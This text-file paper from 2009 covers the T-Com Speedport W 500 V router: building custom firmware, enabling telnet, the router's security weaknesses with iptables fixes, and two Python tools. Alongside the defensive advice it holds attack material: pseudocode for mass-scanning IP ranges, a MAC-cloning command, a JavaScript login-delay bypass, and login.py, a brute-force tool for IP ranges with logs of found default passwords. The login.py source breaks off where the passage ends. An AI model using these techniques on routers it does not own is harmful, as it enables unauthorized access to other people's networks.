@@ -1,0 +1,1241 @@
+
+                      T-COM LINUX ROUTER SECURITY
+                      The T-Com Speedport W 500 V
+                         by anon / 13.01.2009
+
+
+
+
+ index
+ -----
+
+  0x0 : disclaimer
+  0x1 : intro
+  0x2 : router details
+  0x3 : compiling your own linux
+  0x4 : enable telnetd ( busybox )
+  0x5 : router security
+  0x6 : some code
+  0x7 : TCP/IP morse led - red.py
+  0x8 : HTTP/HTTPS key recovery - login.py
+
+
+
+
+ 0x0 : disclaimer
+ ----------------
+
+  This file contains information about the T-Com Speedport W 500 V router.
+  The information included is for compiling your own linux on the router
+  and how to make the router more secure with your own compiled and
+  configured linux. It also shows some insecurity on that router just as
+  information and includes the source of a HTTP/HTTPS brute force program
+  to recover your key if lost or forgotten.
+  
+  Use this information _wise_ and with care on _your own_ system. -- anon
+
+  ALL RIGHTS RESERVED by anon. - 2009
+
+
+
+ 0x1 : intro
+ -----------
+
+  The paper is splitted into some sections. Section 0x7 "red.py" is a tool
+  which uses "socket" and "time" to translate ASCII signs or a *.TXT file
+  into morse signals to send them over TCP/IP to an (enabled) telnetd
+  server on the linux router side. There a program "ledtest 0|1" will be
+  called to make 4 LEDs of the router flashing the morse signals.
+
+  Section 0x8 is the source code of a program which makes a brute force
+  attack over HTTP and HTTPS to the router from outside ( internet ) and
+  inside ( localhost ). The program is a proof of concept and can be used
+  to recover your key if it is lost or forgotten. ( login.py )
+
+  Section 0x3 is a little introduction and "howto" to compile your own 
+  linux system from the sources for your router which means to build your
+  own Linux system with all the software and configuration you want
+  (kernel, daemons, software, mount, your _own_ code etc..) - this is
+  possible because the whole 90 MB source code is online for this router.
+  Thanks to the T-Com for building this nice router and for the sources
+  online. :-)
+
+  Section 0x5 is a bit about the security of this router and in section
+  0x2 you get an overview about some router details (hardware & software).
+  And section 0x4 is about how to enable "telnetd" to have access to the
+  whole nice linux system of the router over a shell. ( "login" )
+
+  Normally only port 80 and port 443 ( HTTP & HTTPS ) are open for your
+  webserver configuration menu that is what we wanna change - to explore
+  the linux system on that router by compiling our _own_ linux, opening
+  a port (23) with an access shell to the linux system behind - as a
+  little practical example and of course making the router more secure
+  than before with a spotlight on the insecurity of it also with a proof
+  of concept program. - Have fun.
+
+
+
+ 0x2 : router details
+ --------------------
+
+  Here are some details about the router - the standard configuration:
+
+ -------------------------------------------------------------------------
+
+  producer: T-COM
+  name: Speedport W 500 V
+
+  server IP: 192.168.2.1
+  client IP: 192.168.2.*
+  open inside ports: HTTP/80, HTTPS/443
+  open outside ports: HTTPS/443
+
+  PPPoE: yes
+  DHCP: yes
+
+  4 logins in /var/passwd:
+    user , root , nobody , support
+  password by default ( for all 4 ): "0000"
+  password min length: 4 signs
+  password max length: 12 signs
+  password (web conf.) signs: A-Z, a-z, 0-9
+
+  total RAM: 14240 kb
+  read/write memory in /var: 128 kb ( the only R/W place )
+  linux version: 2.6.8.1 gcc 3.4.2
+  cpu model: BCM6348 V0.7
+  number of LEDs: 7
+  buttons: 1 power button, 1 reset button
+
+  2 wireless lan antennas ( WLAN )
+  WLAN encryption: WEP, WPA, WPA2
+  MAC filter "protection"
+
+  mount:
+    /dev/mtdblock0 on / type squashfs (ro)
+    /proc on /proc type proc (rw, nodiratime)
+    tmpfs on /var type tmpfs (rw )
+
+  HTTP webserver: micro_http / "httpd"
+  browser language needed: HTML, JAVASCRIPT
+
+  directory list ( "ls /" ):
+    CVS/ bin/ dev/ etc/ lib/ linuxrc mnt/ proc/ sbin/ tmp/ usr/ var/ webs/
+
+  some nice tools:
+    cat , dmesg , echo , iptables , kill , ledtest , ls , mkdir , mount ,
+    pcscan , ping , ps , pwd , rm , sed , sh , sysinfo , false , true ,
+    wlctl , ifconfig , insmod , reboot , route , vconfig , test , expr ..
+
+ -------------------------------------------------------------------------
+
+  This is just a bit to get an overview. If you wanna change something you
+  have to compile your own linux system for this router to enable some
+  usefull daemons, to install new software, for new configurations and of
+  course for your own code maybe. 
+
+
+
+ 0x3 : compiling your own linux
+ ------------------------------
+
+  If you want your own linux on this system then you have to compile your
+  own linux from the source. First you need the sources for your router.
+  Take a look on an internet searchengine or go to an official T-Com site
+  and look for the sources for your router. A source file could look like
+  this here:
+
+     "bcm963xxSpeedportW500V.1.*.*_consumer_release.tar.gz"
+
+  Get it, unpack it with "tar xfz" and install it with the *.sh script.
+  You need a *linux* system of course to install it or at least software
+  like cygwin if you have a windows system. Cygwin is a linux environment
+  which runs under windows. You need also kernel sources and headers for
+  your linux system to compile your own linux system for your router.
+
+  If your system has problems with the *.rpm files then get the program
+  "alien" and make an "alien *.rpm" in your shell. This command will build
+  the *.deb packets if your system needs it. If the system gives you some
+  error messages then read them and try to understand them and then try to
+  fix them - maybe if you need some more libraries then install them with
+  "apt-get install" or "aptitude" and then make a "dpkg -i *.deb" and try
+  to install them again. If you dont get it: get a searchengine and search
+  for help - this is not a linux howto.
+
+  After all went well we can enter "/opt/bcm963xx_router/" where our
+  source code is. If we now wanna build our own linux system ( update for
+  the router ) we have to give a "make PROFILE=$YOUR_PROFILE" for example
+  "make PROFILE=96359R" into our shell. The right profile name you will
+  find in "target/".
+
+  If all went well we have now our update file in "images/". Now we can
+  connect with our browser to our router to make a software update if you
+  wanna try or test it.
+
+  But we can do better things of course like compiling our *own* software
+  and set our own configurations we want to run on the linux router. Just
+  look around in "kernel/linux" - the directory for the kernel sources -
+  and make some changes if you want or go to "userapps/opensource/" - the
+  directory for the sources of linux and change what you want and add what
+  you need and then compile your system again and install the new image.
+  Again: if you become error messages then try to understand them and then
+  try to fix them - read them carefully because they contain often a lot
+  to fix the problem. You can also read the source help files of the
+  program you wanna compile or the source code itself - this is a lot of
+  help and a good read of course.
+
+  Some important files which you have to edit maybe are:
+
+     /opt/bcm963xx_router/userapps/opensource/busybox/brcm.config
+     /opt/bcm963xx_router/Makefile
+     /opt/bcm963xx_router/targets/defaultcfg/default.xml
+     /opt/bcm963xx_router/targets/fs.src/etc/*
+
+  "brcm.config" you need to enable services like "telnetd" ( which we will
+  do in section 0x4 ) , "Makefile" to build the system ( you can edit it
+  to add more what is to compile f.e.: sshd ) , "default.xml" you need to
+  enable services like FTP, HTTP, telnet and so on and in "../etc/*" we
+  have lots of files from linux itself which we have to edit maybe.
+
+  That is all so far to know as a *little* overview. If you just wanna get
+  an update file to open port 23 ( telnet ) on your router without doing /
+  compiling it for yourself you can search for "mod500" at "www.sf.net" -
+  thankfully someone compiled an update to open port 23 with "busybox" /
+  "telnetd" behind. ( 3.3 MB ) "mod500" also contains a *.tar.gz file with
+  all the sources from the update.
+
+
+
+ 0x4 : enable telnetd
+ --------------------
+
+  Now here is a little example with "busybox & telnetd" to show you how to
+  open port 23 ( the telnet port ) that we can enter the linux system to
+  play around with it. Busybox is the program which calls telnetd - so
+  telnetd is compiled into busybox. Busybox is a main program and includes
+  the most programs which run on your linux router box - a few to mention
+  are: ls , sh , echo , mount , rm , kill , dmesg , sysinfo - and so on.
+  You see the program runs the most import programs from within, thus you
+  can compile busybox very small.
+
+  So to enable "telnetd" we have to edit these 3 files here:
+
+     /opt/bcm963xx_router/userapps/opensource/busybox/brcm.config
+     /opt/bcm963xx_router/targets/defaultcfg/default.xml
+     /opt/bcm963xx_router/targets/fs.src/etc/init.d/rcS
+
+  In the file "brcm.config" you have to change a bit (uncomment) and add
+  that it looks like this here:
+  
+     "CONFIG_FEATURE_SUID=y
+      CONFIG_FEATURE_SUID_CONFIG=y
+      CONFIG_FEATURE_SUID_CONFIG_QUIET=y
+      CONFIG_LOGIN=y
+      CONFIG_FEATURE_SECURETTY=y
+      CONFIG_TELNETD=y"
+
+  In "default.xml" we change "disable" to "enable" for telnet:
+  
+     "<srvCtrlList .... telnet="enable" .... />"
+
+  And finally in the file "rcS" in "/etc/" we add the following line for
+  opening port 23 ( telnet ) at the boot of the linux system:
+
+     "/usr/sbin/telnetd telnetd -l /bin/login"
+
+  As a little optic feature you could also edit this file here:
+
+  /opt/bcm963xx_router/userapps/broadcom/cfm/html_t_online_fra/index.htm
+    
+  This is the index for the configuration menu, you could edit it to put
+  your own text or pictures in it for your own configuration menu.
+
+  That is all folks. Now we go directly into the "/opt/bcm963xx_router/"
+  directory and type in our shell like mentioned above:
+  "make PROFILE=$YOUR_PROFILE" and after the whole compiling process you
+  should find your new update linux image to open the telnetd port 23 in
+  "images/". Open your browser connect to the HTML configuration menu of
+  your router with IP "192.168.2.1" and install / upload the update.
+
+  If you do a nmap scan now on port 23 we will see that it is open now -
+  with "nmap 192.168.2.1 -p 23" the following screen will be seen:
+
+     Starting Nmap 3.11 ( http://www.insecure.org/nmap/ )
+     Interesting ports on 192.168.2.1:
+     PORT   STATE SERVICE
+     23/tcp open  telnet
+     MAC Address: 00:00:00:00:00:00 (Tecom Co.)
+     Nmap finished: 1 IP address (1 host up) scanned in 10.180 seconds
+
+  To connect to your new remote linux shell on your router you need a
+  telnet program and in your shell you have to type: "telnet 192.168.2.1"
+  and the following screen comes:
+
+     Trying 192.168.2.1...
+     Connected to 192.168.2.1.
+     Escape character is '^]'.
+
+     (none) login: root
+     Password: 0000
+
+     BusyBox v1.00 (2009.01.13-00:00+0000) Built-in shell (msh)
+     Enter 'help' for a list of built-in commands.
+
+     # cat /proc/version
+     Linux version 2.6.8.1 (root@linux) (gcc version 3.4.2)
+     # exit
+     Connection closed by foreign host.
+
+  "cat" is a program to show the content of files to stdout and with
+  "exit" we close our connection to the router. Now we have *access*. :-)
+
+
+
+ 0x5 : router security
+ ---------------------
+
+  This here is a little overview about the security of this router. It is
+  not complete surely and this section covers only a bit so there is much
+  more insecurity on this router maybe / probably.
+
+  passwords
+  ---------
+
+  This router has a weak password security from standard which means the
+  default password is "0000" - the really insecure situation is if _you_
+  dont change it.
+
+  The password security on the webserver HTML menu is also very low
+  because you dont have the special signs to make a password f.e. "$#&?!@"
+  and so on. You only have all uppercase letters from A-Z, all lowercase
+  letters too from a-z and of course all numbers from 0-9 - but that is
+  all and that is insecure. Because the *more* signs you have the more
+  *strong* is your password.
+
+  The password length is from 4 signs to 12 signs. You should always make
+  a password with all 12 signs. Make a password which is in no dictionary
+  and looks like random signs like: 8rhLFdH36495 - here we have upper
+  case, lowercase and numbers and that is the "most" secure password which
+  is possible on that HTML configuration menu. If you will ever forgot
+  your password you can just push the reset button but then all your
+  account data inside is lost and you have to edit it again - if you dont
+  have it anymore you have to ask your ISP. ( Internet Service Provider )
+
+  The reason for the low password security or the weak password without
+  the special signs is simply that T-Com installed a very *old* version
+  from passwd.c which indeed only supports letters and numbers. Now this
+  was a very bad idea. But really: most software on this router is very
+  old maybe or probably to keep the system small. Most older versions of
+  software are much smaller also because they have not so much features.
+  Thus, also from a software point of view, the security is very weak
+  because old software contains lots of bugs which are like open doors for
+  unwanted attackers.
+
+  This old version from passwd.c only supports passwords with a length of
+  8 signs but in their HTML web configuration menu you can make a password
+  with the length of 12 signs for WEB access - but this is a joke because
+  passwd will only accept 8 signs which means: if you made this password:
+  "0123456789AF" over the HTML web configuration menu and you give it to
+  your linux shell when you enter it over telnet - then it will take it
+  - but if you give the password "01234567" to the telnet shell it will
+  also take it because it can *only* handle 8 signs. Though the HTML web
+  configuration menu only accepts the 12 signs.
+
+  You should try to compile a new version from passwd.c and then you can
+  change the password and make a strong password with the special signs
+  included for shell access. Probably you also need to change some JAVA
+  code inside of the HTML web configuration sites - there it is set that
+  you can only enter letters and numbers but no special signs.
+
+  remote control
+  --------------
+
+  Somebody from outside can connect to your router if he has your IP - he
+  just have to open a browser and entering the following URL:
+  "https://your_IP" - "http://.." will not functioning because the remote
+  function only supports SSL / HTTPS / port 443. 
+
+  This is "nice" because it is encrypted but this is insecure too because
+  somebody can connect to your router and you _cant_ disable it over _the
+  HTML menu_ if you dont want it or need it.
+
+  But we can close it with a self compiled linux update from the sources -
+  - for example with the help of "iptables" and a ruleset in
+  "/etc/init.d/rcS" to drop packets from the remote port HTTPS / 443. (
+  drop every packet what has the destination port 443 - "man iptables" for
+  more help ) The standard rule for INPUT (ACCEPT) for REMOTE_ACCESS on
+  the router is:
+
+     Chain INPUT (policy ACCEPT)
+     target     prot opt source   destination
+     REMOTE_ACCESS  tcp  --  anywhere   anywhere   tcp dpt:https
+
+  This is what we exactly would have to change to drop these 443 packets.
+  Because REMOTE_ACCESS is the second ( 2. ) line in our INPUT table we
+  have to give iptables a rule that it will exactly delete the second
+  line - we will do this with this command:
+
+     iptables -D INPUT 2
+
+  Then we delete the whole REMOTE_ACCESS table with:
+
+     iptables -X REMOTE_ACCESS
+
+  Now we will insert the rule that iptables will drop all packets that
+  wanna reach our server from the outside with port 443:
+
+     iptables -I INPUT -p tcp -m tcp --dport https DROP -i $INTERFACE
+
+  If we add these 3 rule lines to rcS in etc then iptables will use these
+  rules with every boot your router makes. $INTERFACE is the interface we
+  choose - so if we wanna drop for wl0 , br0 or eth0 - if we dont set the
+  "-i" option then iptables will drop *all* https traffic no matter from
+  which interface the traffic will come. You must add them before you
+  compile your linux system.
+
+  You could also change the URL for the HTML password login to your own
+  *.html site which an attacker can not know - the directory for doing it
+  is this here:
+
+     /opt/bcm963xx_router/userapps/broadcom/cfm/html_t_online_fra/
+
+  If someone has access to your router he could disable your firwall, he
+  could install a new linux update where "iptables" ( the linux firewall )
+  is disabled and / or he could also install some sniffers to control your
+  data streams and if he finds something interesting like a password he
+  could send it directly to his account. He also could hack from the
+  router into your computer. Or he could just log your emails, scanning
+  for private pictures and so on. I really recommend to _disable_ 443.
+
+  little scenario
+  ---------------
+
+  One attacking scenario from an attacker could be a tool which will test
+  any router in an IP range for the version of the router to find out what
+  kind of router it is and if the tool knows it is a "Tecom" router then
+  it could then try to exploit or brute force the running webserverhttpd.
+  If the exploit try has success then the program will log the IP from
+  the router and will try to scan the next ones in the range until the
+  "while" or "for" loop is ready. The attacker could also just look into
+  some HTML URLs to look if he finds a hint for the "0000" password there.
+  If the program knows that the router is the one for what it has searched
+  for then he could log this hint also in that way.
+
+  The basic code concept for this attack could look like this:
+
+     for test_router in ip_range( start_IP , end_IP )
+        try connect( d_IP , d_port_80 ) test_router
+           try get( router_details || r_version || 0000_hint )
+              if success: log ; try_exploit
+                 if success: log ; make_install || brute_force ; break
+              else: log ; break
+
+  You can also give "login.py" a file with a few / range IPs in it to test
+  every single IP for the weak "0000" password. If success the data is
+  shown and logged. ( proof of concept code )
+
+  This is the basic concept for the attacking code. After the scan of the
+  attacker is done the attacker will look in the results of his log file
+  and can now try to attack the system he wants. You see this is probably
+  a huge attack because the code attacks a whole range of router IPs - it
+  could scan the whole internet or a special IP range and could cause a
+  lot of damage probably. So the solution is: configure your firewall well
+  - that HTTPS is rejected from outside , drop all incoming stuff from the
+  internet side so that access have only IPs to what you have connected
+  from the *inside* of your system. And of course try to get updates for
+  the software which runs on that server and rebuild the linux system.
+
+  The attack to guess what kind of server version runs on a machine is
+  called fingerprinting. To attack this router here we could really do it
+  with a simple TCP/IP *connect* - what happens then is that the router 
+  will give us an error message which includes the service which is behind
+  port 80 and that is "micro_httpd". The basic code concept above you
+  use to attack the micro_httpd server itself of course - you just have to
+  look into the source and you will see what kind of version is running
+  from standard on this router / http server. ( the nmap sources will
+  teach you a lot about fingerprinting )
+
+  MAC filter "protection"
+  -----------------------
+
+  The "security" of this router also includes the so called MAC filter
+  protection which means in theory that only systems can connect to the
+  router with the right MAC address of the hardware. But we can clone or
+  double an existing MAC address with the help of "ifconfig" for example.
+  The only thing to do from the attacker side is to get the MAC from the
+  victim ( maybe with a WIFI sniffer or with a scanner ) and then using
+  this command here to clone this MAC address:
+
+     ifconfig $INTERFACE hw ether 00:00:00:00:00:00
+
+  That is all to do. With the cloned MAC address he can now connect to
+  the system of the victim. You could change your personal MAC address
+  daily - with this an attacker would have it a bit harder to attack your
+  system. Brute force is here also possible but probably not necessary.
+  You could also use this to make your system more anonymous.
+
+  WIFI encryption
+  ---------------
+
+  This section here we will make short because the only thing to say here
+  is that WEP and WPA encryption is not secure - there is a lot of
+  software out there ( f.e. aircrack ) to break this encryption very fast.
+  Use WPA2 it is more secure but probably not totally secure - use always
+  the longest encryption key with 63 signs and make a strong password. If
+  you can just use ethernet on your system connected with your router
+  because it is not visible on air and it needs no encryption - so you can
+  not attack it like WIFI of course. So if the router is next to your
+  computer and you dont move your computer ( laptop ) then you should just
+  use ethernet. All encryption protocols here for WIFI can be attacked by
+  a brute force attack to guess the encryption key.
+
+  old software
+  ------------
+
+  Like said before in the passwd.c example. The most software which runs
+  on this router from standard is old and buggy of course which means that
+  there is a lot to attack inside of the running software environment. The
+  "httpd" server for example on this machine is version 1.3.5 from 2004 so
+  it is already over 4 years old which means it includes a lot of bugs to
+  exploit the system probably. So the only thing which helps here are
+  *updates* from the software you run on this linux router system. Look
+  into the source codes for more details - they are always a good read.
+
+  JAVA time "protection"
+  ----------------------
+
+  The login menu uses JAVA "protection" code to prevent people from
+  entering passwords in a short of time. So if you enter a false password
+  then you have to wait a delay of time. If you enter again a false
+  password then the delay is bigger than the delay before, this happens
+  with every false login so the delay becomes bigger and bigger with every
+  false login / password.
+
+  To avoid this an attacker can just turn off JAVA and JAVA script - then
+  you can enter many passwords in a short time and no time delay will
+  happen. 
+
+  With this a brute force attack is also possible over HTTPS until the 
+  right password was sent with a "POST /start.login P1=$PW" - you will
+  see that the right password was sent when a special HTML site will be
+  sent back to you. This brute force attack can happen over HTTP and HTTPS
+  and is shown as proof of concept for key recovery in section 0x8.
+  ( python source code ) Because now there is _no_ delay of time the brute
+  force attack will be fast. And because we have only numbers and letters
+  the attack is even more fast.
+
+  Sorry to say that but the security of this router from standard is very
+  *weak* and easy to break. But it is never the less a nice router to play
+  with.
+
+
+
+ 0x6 : some code
+ ---------------
+
+  Here will follow some little programs which i have coded. red.py is a
+  program which connects to telnetd on the router and then it is sending
+  morse signals translated from normal text / ASCII letters. The router
+  will call the program "testled" with status 0 or 1 which means lights
+  on or off to send the morse signals over the LEDs of the router - so you
+  can send morse signals with the LEDs of your router over TCP/IP.
+
+     2 examples:
+        python red.py -t "hello"
+        python red.py -f text.txt
+
+  login.py is a HTTP/HTTPS ( SSL ) brute force / key recovery tool in case
+  you lost or forgot your password and also a proof of concept for the
+  T-Com Speedport W 500 V linux router.
+
+     3 examples:
+        python login.py 192.168.2.1 443 -d password.txt
+	python login.py 192.168.2.1 80 -n 2000
+	python login.py SCANNAME 80 -r ips.txt
+
+     Here are 3 sessions:
+
+        anon@box$ python login.py IPRANGE 443 -r ips.txt
+        T-Com Login - HTTP / HTTPS brute force / By: anon / Version: 0.1
+        Trying brute force on IPRANGE port 443 with option: -r
+        Logging is: ON
+
+        Trying weak password at router: 
+        192.168.1.1
+
+        FOUND PASSWORD. Password is: 0000 .
+
+        192.168.2.66
+        Failed to send request.
+        192.168.2.34
+        Failed to send request.
+        192.168.2.61
+        Failed to send request.
+        192.168.2.1
+
+        FOUND PASSWORD. Password is: 0000 .
+
+        End of scan. Exit.
+
+       ---
+
+        anon@box$ python login.py 192.168.2.1 443 -d pw.txt
+        T-Com Login - HTTP / HTTPS brute force / By: anon / Version: 0.1
+        Trying brute force on 192.168.2.1 port 443 with option: -d
+        Logging is: ON
+
+        Trying passwords: 
+        ADMIN
+        1234567
+        ROOT
+        abcdefgh
+        LINUX
+        UNIX
+        0000
+
+        FOUND PASSWORD. Password is: 0000 . Exit.
+
+       ---
+
+        anon@box$ python login.py 192.168.2.1 80 -n 200
+        T-Com Login - HTTP / HTTPS brute force / By: anon / Version: 0.1
+        Trying brute force on 192.168.2.1 port 80 with option: -n
+        Logging is: ON
+
+        Trying passwords:
+        ....
+        1109
+        1110
+        1111
+        ....
+        1234
+
+        FOUND PASSWORD. Password is: 1234 . Exit.
+
+
+  The programs are written in python ( www.python.org ) and more details
+  and how to use the programs you will find in the following source codes.
+  The sources are uuencoded. By the way you can decode and encode uu files
+  with/in python directly, look ( out of topic ;-) ):
+
+     >>> import uu; from uu import *
+     >>> uu.encode("red.py", "red.py.uu")
+     >>> uu.decode("login.py.uu", "login.py")
+
+  Thanks for reading - take care of you. Cheers & happy exploring! -- anon
+
+
+
+ 0x7 : TCP/IP morse led - red.py
+ -------------------------------
+
+### red.py ###
+##########################################################################
+#
+# PROJECT: RED - routeR morsE leD
+# AUTHOR: anon
+# DATE: 13.01.2009
+# VERSION: 0.1
+# SOFTWARE: python 2.4.4, ledtest, red_*.py, linux, telnetd
+# OS: linux debian
+# HARDWARE: T-Com Speedport W 500 V
+# FILES: red.py
+# 
+#   USE: 
+#   python red.*.py [-tf] "morse text" OR *.TXT
+#
+#    -t : text only - input from stdin
+#    -f : file.txt - input from a file
+#    -h : for help screen
+#
+# INFO:
+# routeR morsE leD - using "telnetd" ( or "sshd" etc. ), "ledtest"
+# on the router and this python tool as a TCP/IP client to send
+# morse signals to the LEDs of your linux router over the ethernet
+# connection.
+#
+# I decided to make this little funny tool with python - sending
+# the signals with a "sleep" over ethernet to telnetd using TCP/IP
+# to the linux router. The python code on your computer makes
+# everything - the only thing what happens on the router side is
+# "ledtest 0|2". So this here is our *.py morse client.
+#
+# This is just a basic idea for a fun (help?) project: turning your
+# router into a LED morse box. But you can really use this maybe for
+# sending a "S O S" if you would ever need it. Or if you have friends
+# and they live in your near then you could send them morse messages
+# out of your window or something like that. On the T-Com Speedport
+# 4 LED lights are flashing on and off so the morse signs are easy
+# to detect at night.
+#
+# "S O S" in morse is: *** --- *** which means 3 times short, 3 times
+# long and 3 times short again. Which means the LEDs are flashing 3
+# times short , 3 times long and 3 times short again.
+#
+# The program includes the logging of what you sent as morse signs
+# and you can also give the program a TXT/ASCII file to read it and
+# send it as morse - it is all stored in a *.TXT logging file if you
+# want. You can also disable the signals for the router then "stdout"
+# is used instead.
+#
+# The program is included in the paper: tcom_router.txt - "T-COM LINUX
+# ROUTER SECURITY - The T-Com Speedport W 500 V - by anon / 01.2009
+#
+# ALL RIGHTS RESERVED BY anon - 2009
+#
+##########################################################################
+
+# some info
+AUTHOR="anon"
+VERSION="0.1"
+MSG="RED - routeR morsE leD"
+
+# needed libraries
+import socket; from socket import *
+import time; from time import *
+import sys; from sys import *
+import string; from string import *
+
+# you may have to edit this here
+# the log file - we only log from stdin
+LOGFILE="red_log.txt"
+# logging on or off
+LOGGING="ON"
+# port and IP
+PORT=23
+IP="192.168.2.1"
+# telnet or ssh login & password
+LOGIN="root"
+PW="0000"
+
+# morse seconds for lights on
+# "-" = long , "*" = short
+LONG=int(2)
+SHORT="0.5"
+SLEEP=int(1)
+
+# morse dictionary from morse.c from FreeBSD ( Thanks! )
+# translated into a python dictionary
+morsetable={'a':".-" , 'b':"-..." , 'c':"-.-." , 'd':"-.." , 'e':"." , \
+'f':"..-." , 'g':"--." , 'h':"...." , 'i':".." , 'j':".---" , 'k':"-.-" , 'l':".-.." , \
+'m':"--" , 'n':"-." , 'o':"---" , 'p':".--." , 'q':"--.-" , 'r':".-." , 's':"..." , \
+'t':"-" , 'u':"..-" , 'v':"...-" , 'w':".--" , 'x':"-..-" , 'y':"-.--" , 'z':"--.." , \
+'A':".-" , 'B':"-..." , 'C':"-.-." , 'D':"-.." , 'E':"." , \
+'F':"..-." , 'G':"--." , 'H':"...." , 'I':".." , 'J':".---" , 'K':"-.-" , 'L':".-.." , \
+'M':"--" , 'N':"-." , 'O':"---" , 'P':".--." , 'Q':"--.-" , 'R':".-." , 'S':"..." , \
+'T':"-" , 'U':"..-" , 'V':"...-" , 'W':".--" , 'X':"-..-" , 'Y':"-.--" , 'Z':"--.." , \
+'0':"-----" , '1':".----" , '2':"..---" , '3':"...--" , '4':"....-",  '5':"....." , \
+'6':"-...." , '7':"--..." , '8':"---.." , '9':"----." , ',':"--..--" , '.':".-.-.-" , \
+'"':".-..-." , '!':"..--." , '?':"..--..", '/':"-..-." , '-':"-....-" , '=':"-...-" , \
+':':"---..." , ';':"-.-.-." , '(':"-.--." , ')':"-.--.-" , '$':"...-..-" , '+':".-.-." , \
+'@':".--.-." , '#':".-..." , '&':"...-.-" , '*':"...-." , '%':"-...-.-", ' ':" "}
+
+# the help function
+def info():
+	print MSG+" / By: "+AUTHOR+" / Version: "+VERSION+"\n"
+	print " Usage:\n\t python red.py [-tf] \"some text\" | file.txt"
+	print " Examples:\n\t python red.py -t \"S O S\""
+	print " \t python red.py -f file.txt"
+	print " \t python red.py -h \n"
+
+# print help if not enough arguments
+if len(argv) < 3:
+	info()
+	# exit
+	exit()
+
+# if -h given then print the help screen
+if argv[1] == "-h":
+	info()
+	# exit
+	exit()
+
+# the main function
+def morse():
+	# print some NFO
+	print MSG+" / By: "+AUTHOR+" / Version: "+VERSION
+	print "Long: "+str(LONG)+" second(s) ; Short: "+str(SHORT)+" second(s)\n"
+
+	# try to open socket
+	try:
+		sock=socket(AF_INET, SOCK_STREAM)
+		print "Created socket."
+	# if we have no success
+	except:
+		print "Failed to create socket. Exit."
+		exit()
+	# try to connect to IP and port
+	try:
+		sock.connect((IP, PORT))
+		print "Connected to "+str(IP)+" on port "+str(PORT)
+	except:
+		print "Failed to connect. Exit."
+		exit()
+	# some sleep otherwise we are too fast
+	sleep(0.5)
+	# try to login
+	try:
+		sock.send(LOGIN+"\r\n")
+		print "Login: "+LOGIN
+	except:
+		print "Login failed. Exit."
+		exit()
+	# some sleep
+	sleep(0.5)
+	# try password
+	try:
+		sock.send(PW+"\r\n")
+		print "Password: "+PW+"\n"
+	except:
+		print "Password login failed. Exit."
+		exit()
+
+	# some sleep
+	sleep(0.5)
+
+	# if we have normal text
+	if argv[1] == "-t":
+		# create text
+		text = argv[2]
+		# is logging on ?
+		if LOGGING == "ON":
+			r=open(LOGFILE, "a")
+			r.write("Begin morse session: "+str(asctime())+"\n")
+			r.write("Morse text: "+str(text)+"\n\n")
+			r.close()
+		# every sign
+		for z in str(text):
+			# print to screen the char
+			print z
+			# get the morse signal
+			for u in morsetable.get(z):
+				# print morse signal to screen
+				print u
+				# sleep and break
+				if str(u) == " ":
+					sleep(1)
+					break
+				# the - sign
+				if str(u) == "-":
+					# lights ON
+					sock.send("ledtest 1\r\n")
+					sleep(LONG)
+					# lights OFF
+					sock.send("ledtest 0\r\n")
+					sleep(SLEEP)
+				# the . sign
+				if str(u) == ".":
+					# lights ON
+					sock.send("ledtest 1\r\n")
+					sleep(0.5)
+					# lights OFF
+					sock.send("ledtest 0\r\n")
+					sleep(SLEEP)
+			sleep(SLEEP)
+
+	# if we have a text file
+	if argv[1] == "-f":
+		file = argv[2]
+		# try open text file
+		try:
+			f=open(file, "r")
+		except:
+			print "Cant open file. Exit"
+			exit()
+		# read file
+		for h in f.readlines():
+			# every sign
+			for z in h[:-1]:
+				# print to screen the char
+				print z
+				# get the morse signal
+				for u in morsetable.get(z):
+					# print morse signal to screen
+					print u
+					# sleep and break
+					if str(u) == " ":
+						sleep(1)
+						break
+					# the - sign
+					if str(u) == "-":
+						# lights ON
+						sock.send("ledtest 1\r\n")
+						sleep(LONG)
+						# lights OFF
+						sock.send("ledtest 0\r\n")
+						sleep(SLEEP)
+					# the . sign
+					if str(u) == ".":
+						# lights ON
+						sock.send("ledtest 1\r\n")
+						sleep(0.5)
+						# lights OFF
+						sock.send("ledtest 0\r\n")
+						sleep(SLEEP)
+				sleep(SLEEP)
+
+	# closing socket connection
+	print "\nClosing Connection. Exit.\n"	
+	sock.shutdown(0)
+	sock.close()
+
+# calling our function morse
+morse()
+
+# EOF
+
+
+
+ 0x8 : HTTP/HTTPS key recovery - login.py
+ ----------------------------------------
+
+### login.py ###
+##########################################################################
+#
+# PROJECT: HTTP/HTTPS password recovery - SSL/HTTP brute force
+# AUTHOR: anon
+# DATE: 13.01.2009
+# BUILD & TESTED ON: linux debian
+# VERSION: 0.1
+# SOFTWARE: python 2.4.4
+# HARDWARE: T-Com Speedport W 500 V
+# FILES: login.py
+#
+#    USE:
+#    python login.py IP PORT [-dn] dictionary OR numbers
+#    python login.py NAME PORT -r IP_range_file
+#
+#     -d : a dictionary file - TXT or whatever
+#     -n : a $number - means range(0, $number)
+#   PORT : port can be 80 or 443 ( SSL )
+#     IP : the router IP of course
+#     -h : help screen
+#     -r : a textfile with IP numbers to try the "0000" PW
+#   NAME : name of your scan
+#
+# INFO:
+# login.py is a brute force utility to recover your key from a T-Com
+# Speedport W 500 V linux router if it is lost or forgotten. Logging the
+# guessed password is also possible. The SSL attack is slow though. Read
+# the source for more info and play around with the range generation.
+#
+#
+#     THE SOFTWARE AND THE PAPER IS WRITTEN TO TEST AND MAKE
+#     THESE THINGS ON YOUR _OWN_ SYSTEM / COMPUTER. I DIDNT
+#     WROTE AND CODED IT FOR CRIMINAL ACTIONS. PERIOD. -- anon
+#
+#
+# The program is included in the paper: tcom_router.txt - "T-COM LINUX
+# ROUTER SECURITY - The T-Com Speedport W 500 V - by anon / 01.2009
+#
+# ALL RIGHTS RESERVED by anon. - 2009
+#
+##########################################################################
+
+# some info
+AUTHOR="anon"
+VERSION="0.1"
+MSG="T-Com Login - HTTP / HTTPS brute force"
+
+# some needed libraries
+import httplib; from httplib import *
+import urllib; from urllib import *
+import sys; from sys import *
+import time; from time import *
+
+# standard password
+PW="0000"
+
+# logging
+LOGGING="ON"
+LOGFILE="login_log.txt"
+
+# for the packet we need
+HEADER = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
+
+# help function
+def info():
+        print MSG+" / By: "+AUTHOR+" / Version: "+VERSION+"\n"
+        print " Usage:\n\t python login.py IP PORT [-dn] file.txt OR number"
+        print " Examples:\n\t python login.py 192.168.2.1 443 -n 9231"
+        print " \t python login.py 192.168.2.1 80 -d passwords.txt"
+        print " \t python login.py SCANNAME 80 -r ips.txt"
+        print " \t python login.py -h \n"
+
+def bf():
+	# print some info
